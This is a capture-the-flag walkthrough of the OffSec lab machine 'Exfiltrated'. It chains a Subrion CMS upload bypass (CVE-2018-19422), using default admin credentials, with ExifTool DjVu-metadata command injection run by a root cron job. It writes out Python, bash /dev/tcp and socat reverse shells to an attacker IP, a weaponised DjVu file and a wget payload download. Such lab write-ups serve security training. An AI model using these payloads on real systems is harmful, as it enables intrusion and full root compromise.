---

tags:

- ctf
    
- offsec
    
- proving-grounds
    
- linux
    
- web
    
- subrion
    
- cms
    
- default-credentials
    
- file-upload
    
- authenticated-file-upload
    
- cve-2018-19422
    
- rce
    
- webshell
    
- www-data
    
- socat
    
- shell-upgrade
    
- cron
    
- scheduled-task
    
- exiftool
    
- djvu
    
- command-injection
    
- privilege-escalation
    
- root
    

---

# Exfiltrated

## Overview

**Platform:** OffSec Proving Grounds Practice  
**Operating System:** Linux  
**Difficulty:** Easy  
**Initial Access:** Subrion CMS authenticated file upload bypass  
**Initial Access CVE:** CVE-2018-19422  
**Privilege Escalation:** Root cron job processing attacker-controlled files with vulnerable ExifTool  
**Final Access:** Root

### Key Techniques

- TCP service enumeration
    
- Virtual host / hostname resolution
    
- `robots.txt` enumeration
    
- CMS fingerprinting
    
- Default credential testing
    
- Authenticated arbitrary file upload
    
- PHP webshell deployment
    
- Remote code execution as `www-data`
    
- Shell upgrade using `socat`
    
- Cron job enumeration
    
- Vulnerable ExifTool discovery
    
- DjVu metadata command injection
    
- Chaining attacker-controlled upload directories with root scheduled tasks
    
- Root reverse shell
    

---

# Attack Path

```text
Port Enumeration
        ↓
HTTP Redirect to exfiltrated.offsec
        ↓
robots.txt Enumeration
        ↓
Discover /panel/
        ↓
Identify Subrion CMS 4.2.1
        ↓
Default Credentials admin:admin
        ↓
CVE-2018-19422
Authenticated File Upload Bypass
        ↓
PHP Webshell / RCE
        ↓
Shell as www-data
        ↓
Upgrade Shell with socat
        ↓
Enumerate /etc/crontab
        ↓
Root Cron Executes ExifTool
Against Uploaded .jpg Files
        ↓
Exploit Vulnerable ExifTool
Using Malicious DjVu Metadata
        ↓
Root Reverse Shell
```

---

# 1. Initial Enumeration

Begin with a basic TCP scan.

```bash
sudo nmap 192.168.231.163
```

Follow this with service and default-script enumeration against the identified ports.

```bash
sudo nmap -p 22,80 -sC -sV 192.168.231.163
```

## Discovered Services

|Port|Service|Notes|
|---|---|---|
|`22/tcp`|SSH|Remote administration|
|`80/tcp`|HTTP|Apache 2.4.41 on Ubuntu|

The web server redirected requests to:

```text
http://exfiltrated.offsec/
```

This means the hostname should be resolved locally before continuing web enumeration.

---

# 2. Add Hostname Resolution

Add the target hostname to `/etc/hosts`.

```bash
echo "192.168.231.163 exfiltrated.offsec" | sudo tee -a /etc/hosts
```

Confirm access through:

```text
http://exfiltrated.offsec/
```

> [!tip] Recognition Pattern  
> If a web server redirects you to a hostname that Kali cannot resolve, add the hostname to `/etc/hosts`.
> 
> Otherwise, tools such as Gobuster and your browser may not interact with the application correctly.

---

# 3. robots.txt Enumeration

The HTTP enumeration exposed several entries in `robots.txt`.

```text
Disallow: /backup/
Disallow: /cron/?
Disallow: /front/
Disallow: /install/
Disallow: /panel/
Disallow: /tmp/
Disallow: /updates/
```

Interesting directories included:

```text
/backup/
/panel/
/install/
/updates/
```

> [!tip] Recognition Pattern  
> `robots.txt` is not an access-control mechanism.
> 
> Disallowed paths often reveal administrative panels, backup directories, installation files, temporary directories, or other sensitive application functionality.

---

# 4. Discover the Subrion CMS Admin Panel

Browsing to:

```text
/panel/
```

revealed the administration interface for:

```text
Subrion CMS v4.2.1
```

This is a major enumeration finding because an exact software version can be used for vulnerability research.

The application also permitted user registration, although the newly created account could not successfully authenticate.

Manual browsing did not reveal an obvious attack path.

---

# 5. Directory Enumeration

Gobuster was used to search for additional web content.

```bash
gobuster dir -u http://exfiltrated.offsec -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -exclude-length 355 --status-codes-blacklist '301','404'
```

Notable results included:

```text
/0/
/updates/
```

`/updates/` returned:

```text
403 Forbidden
```

No significant additional attack surface was identified.

> [!note] Methodology  
> Directory brute-forcing is useful, but once an exact CMS and version have been identified, vulnerability research may provide a more productive path.

---

# 6. Vulnerability Research

The target was running:

```text
Subrion CMS 4.2.1
```

A known authenticated arbitrary file upload vulnerability was identified:

```text
CVE-2018-19422
```

The exploit used was:

```bash
searchsploit -x 49876
```

The exploit required valid administrative credentials.

---

# 7. Test Default Credentials

The walkthrough identified the default Subrion credentials as:

```text
Username: admin
Password: admin
```

These credentials successfully authenticated to the CMS.

> [!tip] Recognition Pattern  
> When an administrative panel is exposed, always consider:
> 
> - Default credentials
>     
> - Weak credentials
>     
> - Vendor-documented defaults
>     
> - Credentials exposed elsewhere on the application
>     
> 
> This is especially important for older CMS installations and appliances.

---

# 8. Exploit Subrion CMS

The exploit was executed using:

```bash
python3 49876.py -u http://192.168.231.163/panel/ --user admin --pass admin
```

The exploit:

1. Authenticated using `admin:admin`
    
2. Bypassed the upload restrictions
    
3. Uploaded a PHP webshell
    
4. Allowed remote command execution
    

---

# 9. Initial Foothold

Command execution was obtained as:

```bash
id
```

Result:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This confirms remote code execution as the web server account:

```text
www-data
```

At this stage:

```text
Subrion CMS
    ↓
Authenticated Upload Bypass
    ↓
PHP Webshell
    ↓
www-data
```

---

# 10. Shell Upgrade with socat

The initial shell was not fully interactive.

Python was unavailable on the target, so `socat` was used instead.

## Attacker Listener

```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

## Target

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.45.227:4444
```

This returned a more usable interactive terminal.

### What the Options Do

|Option|Purpose|
|---|---|
|`bash -li`|Interactive login Bash shell|
|`pty`|Allocates a pseudo-terminal|
|`stderr`|Redirects stderr through the connection|
|`setsid`|Creates a new session|
|`sigint`|Allows Ctrl+C handling|
|`sane`|Applies sane terminal settings|

> [!tip] Recognition Pattern  
> If Python is unavailable but `socat` exists, it can be an excellent way to obtain a fully interactive TTY.

---

# 11. Privilege Escalation Enumeration

With a stable shell, begin standard Linux privilege escalation checks.

Useful areas include:

```text
sudo permissions
SUID binaries
scheduled tasks / cron
writable files
running services
credentials
kernel version
capabilities
interesting scripts
```

The walkthrough checked SUID binaries using:

```bash
find / -perm -4000 2>/dev/null
```

The following also returned nothing useful:

```bash
sudo -l
```

The key discovery came from scheduled task enumeration.

---

# 12. Enumerate Cron Jobs

Inspect the system crontab.

```bash
cat /etc/crontab
```

A job was discovered that executed every minute as:

```text
root
```

The associated script processed image files within:

```text
/var/www/html/subrion/uploads
```

using:

```text
exiftool
```

This creates a particularly interesting privilege escalation condition:

```text
Low-privileged user controls files
        +
Root-owned process parses those files
        =
Potential privilege boundary
```

> [!tip] Recognition Pattern  
> Whenever a root cron job processes files from a directory writable by your current user, investigate the parser or utility being used.
> 
> The scheduled job may itself be secure while the program processing attacker-controlled files is vulnerable.

---

# 13. Identify ExifTool Attack Surface

The cron job ran ExifTool against `.jpg` files in:

```text
/var/www/html/subrion/uploads
```

The installed ExifTool version was:

```text
11.88
```

The walkthrough identified Exploit-DB:

```text
49881
```

which abuses command injection through malicious DjVu metadata.

This provided the privilege escalation path.

---

# 14. Privilege Escalation Logic

The attack chain is:

```text
www-data can write to uploads
        ↓
Root cron job scans uploads
        ↓
ExifTool parses attacker-controlled image
        ↓
ExifTool processes malicious DjVu metadata
        ↓
Embedded command executes
        ↓
Command executes as root
```

This is more important than memorising the specific exploit.

> [!tip] Key Principle  
> A privileged process that consumes attacker-controlled data effectively extends its attack surface to every parser and utility involved in processing that data.

---

# 15. Prepare the Malicious Payload

The walkthrough prepared two files on the attacker machine.

## Reverse Shell Script

A file named:

```text
shell.sh
```

contained:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.227",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

The key payload used for the ExifTool exploitation was placed in a separate metadata file.

---

# 16. Create Malicious DjVu Metadata

Create a file called:

```text
exploit
```

containing:

```text
(metadata "\c${system('bash -c "bash -i >& /dev/tcp/192.168.45.227/4444 0>&1"')};")
```

The embedded command creates a reverse Bash shell back to:

```text
192.168.45.227:4444
```

---

# 17. Create the Weaponized DjVu File

Use `djvumake`:

```bash
djvumake exploit.djvu INFO=0,0 BGjp=/dev/null ANTa=exploit
```

This creates:

```text
exploit.djvu
```

Rename it so that the cron job treats it as a `.jpg` file:

```bash
mv exploit.djvu exploit.jpg
```

> [!tip] Recognition Pattern  
> File extensions do not necessarily represent the actual file format.
> 
> If an automated process selects files by extension but a parser detects the underlying format internally, a malicious file can sometimes be disguised using another extension.

---

# 18. Transfer the Payload

Serve the malicious file from the attacker machine.

For example:

```bash
python3 -m http.server 80
```

On the target:

```bash
wget 192.168.45.227/exploit.jpg
```

Move or place the file in:

```text
/var/www/html/subrion/uploads
```

---

# 19. Start the Reverse Shell Listener

Before the cron job processes the file, start a listener on the attacker machine.

```bash
nc -lvnp 4444
```

The cron job runs every minute.

When ExifTool parses:

```text
exploit.jpg
```

the malicious metadata executes.

---

# 20. Root Shell

The reverse shell returned with root privileges.

Verify with:

```bash
id
```

Expected result:

```text
uid=0(root)
```

Additional confirmation:

```bash
whoami
hostname
```

Expected:

```text
root
```

---

# Reusable Methodology

## Web Application Enumeration

When discovering an HTTP service:

```text
1. Check redirects and hostnames
2. Inspect robots.txt
3. Browse interesting directories
4. Identify application/CMS
5. Determine exact version
6. Check administrative interfaces
7. Test known/default credentials
8. Perform directory enumeration
9. Research version-specific vulnerabilities
```

---

# CMS Exploitation Methodology

If a CMS and exact version are known:

```bash
searchsploit <CMS>
```

or:

```bash
searchsploit "<CMS> <VERSION>"
```

Look specifically for:

```text
Authentication bypass
File upload
Arbitrary file upload
Remote code execution
SQL injection
Local file inclusion
Administrative vulnerabilities
```

---

# Default Credential Checks

If an administrative panel is exposed:

```text
Search vendor documentation
Check known default credentials
Check installation guides
Check old deployment documentation
Test obvious defaults
```

For this machine:

```text
admin:admin
```

provided access.

---

# Linux Privilege Escalation Workflow

After initial access:

```bash
id
whoami
sudo -l
```

Enumerate SUID binaries:

```bash
find / -perm -4000 2>/dev/null
```

Inspect scheduled tasks:

```bash
cat /etc/crontab
```

Also consider:

```bash
ls -la /etc/cron*
```

Pay particular attention to:

```text
Root-owned scheduled jobs
Writable scripts
Writable directories
Wildcard usage
Utilities processing attacker-controlled files
Old/vulnerable binaries
```

---

# Cron Job Abuse Methodology

When you find a root cron job, ask:

```text
What command does it execute?
        ↓
Can I modify the script?
        ↓
Can I modify a binary it calls?
        ↓
Can I control its PATH?
        ↓
Can I control arguments?
        ↓
Can I control files it processes?
        ↓
Is the called program vulnerable?
```

In Exfiltrated:

```text
Cannot directly modify root cron
        ↓
Can control image files
        ↓
Root invokes ExifTool
        ↓
ExifTool version is vulnerable
        ↓
Malicious metadata executes as root
```

---

# Quick Reference

## Initial Nmap

```bash
sudo nmap <TARGET>
```

## Service Enumeration

```bash
sudo nmap -p 22,80 -sC -sV <TARGET>
```

---

## Add Virtual Host

```bash
echo "<TARGET> exfiltrated.offsec" | sudo tee -a /etc/hosts
```

---

## Gobuster

```bash
gobuster dir -u http://exfiltrated.offsec -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -exclude-length 355 --status-codes-blacklist '301','404'
```

---

## Inspect Subrion Exploit

```bash
searchsploit -x 49876
```

---

## Exploit Subrion

```bash
python3 49876.py -u http://<TARGET>/panel/ --user admin --pass admin
```

---

## Check Identity

```bash
id
```

---

## socat Listener

```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

## socat Reverse Shell

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<ATTACKER_IP>:4444
```

---

## Find SUID Files

```bash
find / -perm -4000 2>/dev/null
```

---

## Check Cron

```bash
cat /etc/crontab
```

---

## Create Malicious DjVu

```bash
djvumake exploit.djvu INFO=0,0 BGjp=/dev/null ANTa=exploit
```

---

## Rename as JPG

```bash
mv exploit.djvu exploit.jpg
```

---

## Serve Payload

```bash
python3 -m http.server 80
```

---

## Download Payload

```bash
wget <ATTACKER_IP>/exploit.jpg
```

---

## Reverse Shell Listener

```bash
nc -lvnp 4444
```

---

# Recognition Patterns

|Observation|Investigate|
|---|---|
|HTTP redirects to unknown hostname|`/etc/hosts` / virtual host|
|Interesting `robots.txt` entries|Manually inspect paths|
|`/panel/`|CMS/admin interface|
|Exact CMS version visible|Search version-specific exploits|
|Admin interface exposed|Default credentials|
|File upload available|Upload bypass / RCE|
|Shell as `www-data`|Local privilege escalation|
|Python unavailable|`socat`, Perl, Bash, other shell methods|
|Root cron job|Scheduled-task abuse|
|Cron processes user-controlled files|Parser/library vulnerabilities|
|ExifTool processing images|Check ExifTool version|
|`.jpg` automatically processed|File format / metadata attacks|
|Privileged parser consumes attacker input|Potential command execution as privileged user|

---

# Key Lessons

> [!tip] Enumerate robots.txt  
> Entries in `robots.txt` often reveal precisely the directories administrators did not want indexed. Treat them as enumeration leads.

> [!tip] Fingerprint the Application  
> Identifying an exact CMS and version can be more valuable than brute-forcing hundreds of directories.

> [!tip] Test Default Credentials  
> A vulnerability requiring authentication may still be exploitable if the application retains vendor-default administrative credentials.

> [!tip] File Upload Can Become RCE  
> If an application allows executable server-side content to be uploaded into a web-accessible location, file upload can become remote code execution.

> [!tip] Know More Than One Shell Upgrade Method  
> Python is not guaranteed to be installed. `socat` provides an excellent alternative when present.

> [!tip] Always Check Cron  
> Scheduled jobs are a major Linux privilege escalation vector, especially when they execute as root.

> [!tip] Look Beyond Writable Scripts  
> You do not necessarily need to modify the cron script itself. Controlling the data consumed by a privileged task can be enough.

> [!tip] Parsers Are Attack Surfaces  
> Image, document, archive and metadata parsers may contain vulnerabilities that become much more serious when executed by privileged services.

> [!tip] Follow the Trust Boundary  
> The key question is not merely:
> 
> `Can I write to this directory?`
> 
> It is:
> 
> `Does anything more privileged automatically process what I place here?`

---

# Attack Chain Summary

```text
Apache Web Server
      ↓
Subrion CMS 4.2.1
      ↓
Default admin:admin Credentials
      ↓
CVE-2018-19422
      ↓
Authenticated Upload Bypass
      ↓
PHP Webshell
      ↓
www-data
      ↓
Cron Enumeration
      ↓
Root Processes /uploads/*.jpg
Using ExifTool 11.88
      ↓
Malicious DjVu Metadata
      ↓
Command Injection
      ↓
Root Shell
```
